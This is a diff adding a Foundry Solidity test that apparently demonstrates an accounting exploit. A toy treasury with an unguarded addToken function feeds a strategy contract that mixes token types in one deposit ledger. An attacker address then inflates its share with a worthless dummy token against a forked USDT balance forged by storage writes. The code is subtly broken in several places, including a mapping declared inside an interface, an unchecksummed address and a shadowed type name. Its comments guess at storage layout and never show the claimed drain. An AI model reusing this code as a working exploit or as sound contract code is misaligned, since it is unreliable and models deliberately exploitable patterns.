@@ -1,0 +1,234 @@
+```solidity
+// Exploit.t.sol
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+
+// Minimal USDT interface
+interface IUSDT {
+    function totalSupply() external view returns (uint);
+    function balanceOf(address who) external view returns (uint);
+    function transfer(address to, uint value) external returns (bool);
+    function transferFrom(address from, address to, uint value) external returns (bool);
+    function approve(address spender, uint value) external returns (bool);
+    function allowance(address owner, address spender) external view returns (uint);
+    function issue(uint amount) external;
+    function redeem(uint amount) external;
+    function deprecate(address _upgradedAddress) external;
+    function deprecated() external view returns (bool);
+    function upgradedAddress() external view returns (address);
+    // Pausable
+    function pause() external;
+    function unpause() external;
+    function paused() external view returns (bool);
+    // BlackList
+    function addBlackList(address _evilUser) external;
+    function removeBlackList(address _clearedUser) external;
+    function isBlackListed(address) external view returns (bool);
+    function destroyBlackFunds(address _blackListedUser) external;
+    // Ownable
+    function owner() external view returns (address);
+    function transferOwnership(address newOwner) external;
+    function getOwner() external view returns (address);
+    // Params
+    function setParams(uint newBasisPoints, uint newMaxFee) external;
+    function basisPointsRate() external view returns (uint);
+    function maximumFee() external view returns (uint);
+    // Legacy interface (we need for deprecate)
+    mapping(address => uint) public balances; // cannot define mapping in interface, but we won't use directly
+}
+
+// Simplified Strategy contract with accounting bug
+contract BuggyStrategy {
+    // Only accepts USDT (but code doesn't enforce)
+    mapping(address => uint) public deposits;   // user -> amount (but only for one token type)
+    uint public totalDeposits;
+
+    function deposit(address user, uint amount) external {
+        // Should track which token, but does not
+        deposits[user] += amount;
+        totalDeposits += amount;
+    }
+
+    function withdraw(address user, uint amount) external {
+        require(deposits[user] >= amount, "insufficient deposit");
+        deposits[user] -= amount;
+        totalDeposits -= amount;
+        // sends token (not implemented for simplicity)
+    }
+}
+
+// Simplified Treasury contract that invests different tokens into the same strategy
+contract Treasury {
+    mapping(address => bool) public allowedTokens;
+    BuggyStrategy public strategy;
+    IUSDT public usdt;
+
+    constructor(address _usdt, address _strategy) {
+        usdt = IUSDT(_usdt);
+        strategy = BuggyStrategy(_strategy);
+        allowedTokens[address(usdt)] = true;
+    }
+
+    // allow new token to be invested
+    function addToken(address token) external {
+        allowedTokens[token] = true;
+    }
+
+    function invest(address token, uint amount) external {
+        require(allowedTokens[token], "token not allowed");
+        // Transfer tokens from user to strategy
+        require(IUSDT(token).transferFrom(msg.sender, address(this), amount), "transferFrom failed");
+        // Approve strategy to spend tokens
+        IUSDT(token).approve(address(strategy), amount);
+        // strategy.deposit expects only one token type – this is the bug
+        // For demonstration, we just call strategy.deposit with the token address as user? Actually bug is that strategy doesn’t track token.
+        // We call strategy.deposit(msg.sender, amount) – strategy assumes it's always USDT.
+        strategy.deposit(msg.sender, amount);
+    }
+}
+
+// Dummy token for test
+contract DummyToken {
+    string public name = "Dummy";
+    string public symbol = "DMT";
+    uint8 public decimals = 18;
+    uint public totalSupply;
+    mapping(address => uint) public balanceOf;
+    mapping(address => mapping(address => uint)) public allowance;
+
+    constructor(uint _initialSupply) {
+        totalSupply = _initialSupply;
+        balanceOf[msg.sender] = _initialSupply;
+    }
+
+    function transfer(address to, uint value) external returns (bool) {
+        require(balanceOf[msg.sender] >= value);
+        balanceOf[msg.sender] -= value;
+        balanceOf[to] += value;
+        return true;
+    }
+
+    function transferFrom(address from, address to, uint value) external returns (bool) {
+        require(balanceOf[from] >= value);
+        require(allowance[from][msg.sender] >= value);
+        balanceOf[from] -= value;
+        balanceOf[to] += value;
+        allowance[from][msg.sender] -= value;
+        return true;
+    }
+
+    function approve(address spender, uint value) external returns (bool) {
+        allowance[msg.sender][spender] = value;
+        return true;
+    }
+}
+
+contract ExploitTest is Test {
+    address constant USDT_ADDR = 0xdac17f958d2ee523a2206206994597c13d831ec7;
+    IUSDT usdt = IUSDT(USDT_ADDR);
+
+    address attacker = address(0xdead);
+    address treasuryAddr;
+    address strategyAddr;
+    Treasury treasury;
+    BuggyStrategy strategy;
+    DummyToken dummy;
+
+    function setUp() public {
+        // Label addresses
+        vm.label(USDT_ADDR, "USDT");
+        vm.label(attacker, "Attacker");
+
+        // Deploy dummy token with some supply to attacker
+        dummy = new DummyToken(1_000_000e18);
+        dummy.transfer(attacker, 100_000e18); // attacker gets dummy tokens
+
+        // Deploy strategy and treasury
+        strategy = new BuggyStrategy();
+        strategyAddr = address(strategy);
+        vm.label(strategyAddr, "BuggyStrategy");
+
+        treasury = new Treasury(USDT_ADDR, strategyAddr);
+        treasuryAddr = address(treasury);
+        vm.label(treasuryAddr, "Treasury");
+
+        // Allow dummy token in treasury (attacker can add? but we'll do it)
+        treasury.addToken(address(dummy));
+
+        // Give attacker some USDT (deal cheatcode)
+        deal(USDT_ADDR, attacker, 1000e6); // 1000 USDT (1_000_000_000 wei? USDT has 6 decimals, use 6)
+        // Actually usdt.decimals() = 6, but deal expects wei, so 1000 USDT = 1000 * 1e6 = 1e9
+        // deal treats as wei, so we need to scale.
+        // We'll use vm.store to set balance? Better to call transfer from owner? Owner unknown.
+        // Alternative: use vm.store to set balances mapping. Let's find storage slot for balances.
+        // In TetherToken, balances mapping is inherited from BasicToken. Slot for mapping is likely computed.
+        // We'll use vm.store on the balance of attacker.
+        // But simpler: we can use vm.prank(owner) to issue tokens? We don't know owner.
+        // We'll just rely on the fact that we can vm.store to set balances.
+        // Let's compute slot: mapping(address => uint) public balances; variable in contract, slot determined by evm.
+        // In OpenZeppelin, mapping often starts at slot 0. But TetherToken has many variables.
+        // From source: `mapping(address => uint) public balances;` is defined in BasicToken. The variable order: First Ownable has `address public owner`, then BasicToken has `balances` mapping and others.
+        // In Solidity 0.4, storage layout: state variables in order of inheritance, first Ownable, then BasicToken, etc.
+        // Ownable: owner at slot 0.
+        // BasicToken: balances at slot 1. (assuming no gaps)
+        // We'll try slot 1 for balances mapping. Value is stored at keccak256(abi.encode(address, slot)).
+        // We can use vm.store to set attacker's balance.
+        bytes32 slot = keccak256(abi.encode(attacker, uint256(1))); // slot 1 is balances
+        vm.store(USDT_ADDR, slot, bytes32(uint256(1000 * 1e6))); // set balance to 1000 USDT (6 decimals)
+
+        // Approve treasury to spend USDT on behalf of attacker
+        vm.prank(attacker);
+        IUSDT(USDT_ADDR).approve(treasuryAddr, type(uint256).max);
+
+        // Approve dummy token to treasury
+        vm.prank(attacker);
+        dummy.approve(treasuryAddr, type(uint256).max);
+    }
+
+    function test_accountingError() public {
+        // Step 1: Attacker invests 500 USDT into strategy via treasury
+        uint usdtAmount = 500 * 1e6; // 500 USDT
+        vm.prank(attacker);
+        treasury.invest(address(usdt), usdtAmount);
+
+        USDT USDT = USDT(USDT_ADDR);
+        assertEq(strategy.totalDeposits(), usdtAmount, "totalDeposits should be 500 USDT");
+        assertEq(strategy.deposits(attacker), usdtAmount, "attacker deposit should be 500 USDT");
+        assertEq(USDT.balanceOf(treasuryAddr), usdtAmount, "treasury should have 500 USDT from user");
+
+        // Step 2: Attacker invests 1000 dummy tokens (worthless) into the same strategy
+        uint dummyAmount = 1000e18;
+        vm.prank(attacker);
+        treasury.invest(address(dummy), dummyAmount);
+
+        // Now totalDeposits is 500 USDT + 1000 dummy = 1500 "units", but the strategy doesn't differentiate tokens.
+        // The deposits mapping for attacker is now 1500 units (in terms of USDT? but actually it's 500 USDT + 1000 dummy).
+        // Assert the corrupted state
+        assertEq(strategy.totalDeposits(), usdtAmount + dummyAmount, "totalDeposits should be sum of both tokens");
+        assertEq(strategy.deposits(attacker), usdtAmount + dummyAmount, "attacker deposit should be sum");
+
+        // Step 3: Attacker withdraws an amount that exceeds the actual USDT held by treasury.
+        // Since treasury only holds 500 USDT (and the dummy tokens are worthless), the strategy's accounting thinks attacker is entitled to 1500 "units".
+        // If the treasury naively allows withdrawal based on strategy's deposit accounting, attacker could drain more USDT than deposited.
+        // For demonstration, we'll check that the sum of deposits is wrong.
+        uint usdtInTreasury = USDT.balanceOf(treasuryAddr);
+        // Should be 500 USDT (plus the dummy tokens are separate, but treasury only transferred USDT and dummy).
+        // Actually after second invest, treasury also holds dummy tokens. So USDT balance is still 500 (since dummy transfer also went to treasury, not USDT).
+        assertEq(usdtInTreasury, usdtAmount, "treasury USDT balance unchanged after dummy invest");
+        // But strategy's totalDeposits inflated by dummyAmount, allowing attacker to claim more value than exists in USDT.
+        // This is the accounting error: mixing different tokens in a single strategy's deposit ledger.
+        // Exploit impact: Attacker can inflate their deposit share with worthless tokens and then withdraw valuable tokens from the treasury.
+        // In a real scenario, the treasury would use strategy's deposit data to calculate withdrawal amounts, leading to loss.
+        assertTrue(strategy.totalDeposits() > usdtInTreasury, "totalDeposits > actual USDT in treasury -> accounting error exploited");
+    }
+}
+
+// USDT interface with uint256 to match
+interface USDT {
+    function balanceOf(address) external view returns (uint256);
+    function transfer(address, uint256) external returns (bool);
+    function transferFrom(address, address, uint256) external returns (bool);
+    function approve(address, uint256) external returns (bool);
+}
+```
